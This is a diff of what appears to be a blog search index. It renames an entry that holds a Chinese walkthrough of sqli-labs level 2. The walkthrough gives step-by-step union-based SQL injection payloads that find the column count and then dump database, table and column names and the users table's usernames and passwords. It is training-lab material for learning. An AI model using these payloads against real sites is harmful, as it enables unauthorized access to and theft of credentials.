@@ -36,9 +36,9 @@
   
   
   <entry>
-    <title>测试文章</title>
-    <link href="/2021/06/10/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
-    <url>/2021/06/10/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
+    <title>sqli-libs</title>
+    <link href="/2021/06/10/sqli-libs/"/>
+    <url>/2021/06/10/sqli-libs/</url>
     
     <content type="html"><![CDATA[<p>第二关<br>1.判断注入类型：<br>?id&#x3D;1 正常<br>?id&#x3D;1’异常<br>?id&#x3D;1’–+ 异常<br>由此判断为整型注入<br>2.判断字段数：<br>?id&#x3D;1 order by 3 正常<br>?id&#x3D;1 order by 4 异常<br>判断字段数为3<br>3.爆数据库名<br>?id&#x3D;-1 union select 1,database(),3<br>可以查询到数据库名为security<br>4.爆表名<br>?id&#x3D;-1 union select 1,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;’security’),3<br>由此获得security的四个表，emails，referers,uagents,users<br>5.爆字段名<br>?id&#x3D;-1 union select 1,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;’security’and table_name&#x3D;’users’),3<br>获得表users的三个字段名，id，username，password<br>6.取数据<br>?id&#x3D;-1 union select 1,(select group_concat(id,username,password)from users),3</p>]]></content>
     
